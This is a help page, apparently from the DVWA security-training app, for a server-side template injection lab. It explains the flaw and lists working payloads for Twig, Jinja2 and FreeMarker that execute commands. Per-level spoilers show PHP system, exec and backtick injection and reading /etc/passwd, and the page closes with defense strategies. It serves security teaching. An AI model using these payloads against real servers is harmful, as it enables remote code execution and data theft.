<div class="body_padded">
	<h1>Help - Server-Side Template Injection (SSTI)</h1>

	<div id="code">
		<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
			<tr>
				<td><div id="code">
					<h3>About</h3>
					<p>Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is embedded into a template in an unsafe manner, allowing an attacker to inject template directives and potentially execute arbitrary code on the server.</p>
					
					<p>Template engines are designed to combine templates with data to produce dynamic web pages. When user input is concatenated directly into templates before rendering, attackers can break out of the template context and inject malicious template directives.</p>

					<h3>How SSTI Works</h3>
					<p>Template engines process special syntax to:</p>
					<ul>
						<li>Display variables: <code>{{username}}</code></li>
						<li>Execute expressions: <code>{{7*7}}</code></li>
						<li>Call functions: <code>{{system('whoami')}}</code></li>
						<li>Access objects: <code>{{request.application}}</code></li>
					</ul>
					<p>When user input is placed directly into these templates without proper sanitization, attackers can inject their own template syntax.</p>

					<h3>Common Template Engines</h3>
					<ul>
						<li><strong>PHP:</strong> Twig, Smarty, Blade</li>
						<li><strong>Python:</strong> Jinja2, Mako, Tornado</li>
						<li><strong>Java:</strong> FreeMarker, Velocity, Thymeleaf</li>
						<li><strong>JavaScript:</strong> Pug (Jade), Handlebars, EJS</li>
						<li><strong>Ruby:</strong> ERB, Slim, Haml</li>
					</ul>

					<h3>SSTI Payloads</h3>
					<p><strong>Detection (Math expression):</strong></p>
					<pre>{{7*7}}  // Should output 49 if vulnerable
${7*7}
&lt;%= 7*7 %&gt;</pre>

					<p><strong>PHP (Twig/Native):</strong></p>
					<pre>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
${system('whoami')}
&lt;?php system('whoami'); ?&gt;</pre>

					<p><strong>Python (Jinja2):</strong></p>
					<pre>{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}</pre>

					<p><strong>Java (FreeMarker):</strong></p>
					<pre>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("whoami")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","whoami").start()}</pre>

					<h3>Impact</h3>
					<ul>
						<li><strong>Remote Code Execution (RCE):</strong> Execute arbitrary commands on the server</li>
						<li><strong>File System Access:</strong> Read/write sensitive files</li>
						<li><strong>Information Disclosure:</strong> Access configuration, environment variables</li>
						<li><strong>Privilege Escalation:</strong> Access internal functions and objects</li>
						<li><strong>Server Takeover:</strong> Complete compromise of the server</li>
					</ul>

					<br /><hr /><br />

					<h3>Objective</h3>
					<p>Your goal is to exploit the SSTI vulnerability to:</p>
					<ul>
						<li><strong>Low:</strong> Execute code using template syntax</li>
						<li><strong>Medium:</strong> Bypass function name blacklist</li>
						<li><strong>High:</strong> Bypass character filtering</li>
						<li><strong>Impossible:</strong> Understand proper SSTI prevention</li>
					</ul>

					<br /><hr /><br />

					<h3>Low Level</h3>
					<p>The low level directly evaluates user input as part of the template using eval().</p>
					<p><em>Spoiler:</em> <span class="spoiler">Try injecting PHP code like: ${system('whoami')} or ${phpinfo()} or &lt;?php echo exec('ls -la'); ?&gt;</span></p>

					<br />

					<h3>Medium Level</h3>
					<p>The medium level implements a basic blacklist blocking common dangerous functions.</p>
					<p><em>Spoiler:</em> <span class="spoiler">Try using backticks for command execution: `whoami`, or file functions like: ${file_get_contents('/etc/passwd')}, or use print_r(scandir('.')).</span></p>

					<br />

					<h3>High Level</h3>
					<p>The high level blocks special characters commonly used in template syntax.</p>
					<p><em>Spoiler:</em> <span class="spoiler">This level is difficult to bypass due to character filtering blocking {}, (), $, and other special chars. In real scenarios, encoding or alternative syntax might work depending on the template engine.</span></p>

					<br />

					<h3>Impossible Level</h3>
					<p>The impossible level properly prevents SSTI by:</p>
					<ul>
						<li>Using CSRF token protection</li>
						<li><strong>Never using eval() or dynamic code execution</strong></li>
						<li>Using str_replace() for static template placeholders</li>
						<li>Properly escaping all output with htmlspecialchars()</li>
						<li>Validating input with strict whitelist regex</li>
						<li>Using placeholder syntax that cannot be confused with code</li>
					</ul>
					<p>This is the recommended approach for safe template handling.</p>

					<br />

					<h3>Defense Strategies</h3>
					<ul>
						<li><strong>Never use eval():</strong> Never evaluate user input as code</li>
						<li><strong>Use sandboxed mode:</strong> Enable sandbox mode in template engines (e.g., Twig sandbox)</li>
						<li><strong>Logic-less templates:</strong> Use logic-less template engines when possible (Mustache)</li>
						<li><strong>Input validation:</strong> Strictly validate all user input</li>
						<li><strong>Output encoding:</strong> Always escape output properly</li>
						<li><strong>Avoid string concatenation:</strong> Don't concatenate user input into templates</li>
						<li><strong>Use parameterized templates:</strong> Pass user data as template parameters, not inline</li>
						<li><strong>Keep engines updated:</strong> Update template engines to latest versions</li>
						<li><strong>Security audits:</strong> Regular code review for template usage</li>
					</ul>

					<br />

					<h3>Testing Tips</h3>
					<ul>
						<li><strong>Detect:</strong> Try math expressions: {{7*7}}, ${7*7}, &lt;%= 7*7 %&gt;</li>
						<li><strong>Identify engine:</strong> Use specific syntax errors to fingerprint the engine</li>
						<li><strong>Explore objects:</strong> Access global objects: {{config}}, {{request}}, {{self}}</li>
						<li><strong>PHP wrappers:</strong> Use php://filter for file reading</li>
						<li><strong>Environment leakage:</strong> Try {{_ENV}}, {{getenv}}</li>
						<li><strong>Automation:</strong> Use tools like tplmap, SSTImap</li>
					</ul>

					<br />

					<h3>Real-world Examples</h3>
					<ul>
						<li><strong>Uber (2016):</strong> Jinja2 SSTI leading to RCE</li>
						<li><strong>Shopify (2017):</strong> ERB template injection</li>
						<li><strong>Atlassian (2019):</strong> Velocity template injection</li>
					</ul>

					<br />

					<h3>References</h3>
					<ul>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection', 'OWASP - SSTI Testing Guide' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/research/server-side-template-injection', 'PortSwigger - SSTI Research' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/web-security/server-side-template-injection', 'PortSwigger - SSTI' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection', 'HackTricks - SSTI' ); ?></li>
						<li><?php echo dvwaExternalLinkUrlGet( 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection', 'PayloadsAllTheThings - SSTI' ); ?></li>
					</ul>
				</div></td>
			</tr>
		</table>
	</div>
</div>
